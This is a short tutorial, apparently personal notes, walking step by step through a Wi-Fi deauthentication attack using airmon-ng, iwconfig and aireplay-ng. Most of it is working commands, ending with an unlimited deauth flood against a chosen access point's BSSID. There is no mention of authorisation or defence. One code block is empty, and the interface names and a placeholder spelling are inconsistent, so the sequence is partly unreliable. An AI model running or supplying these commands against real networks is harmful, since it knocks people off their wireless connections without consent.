We begin our attack by running the following command 
**Why do we do this?**
- This is going to kill all processes that may interfere with our attack, killing all processes 
```bash
sudo airmon-ng check kill
```

We now need to put our wifi adaptor into monitor mode:
```bash
sudo airmon-ng start <name_of_your_adaptor>
```

After we run this command we should be able to see all the different clients that are connected to a specific base station
```bash 

```
Depending on the channel that the AP is using we will need to change the channel on our wifi adaptor as well using this command, where `<channel_number>` is the channel number that corresponds to the Wifi service you are trying to deauth the clients from.
```bash
sudo iwconfig wlan1 channel <chanel_number>
```


Now we can run the attack using this command:
```bash
sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
```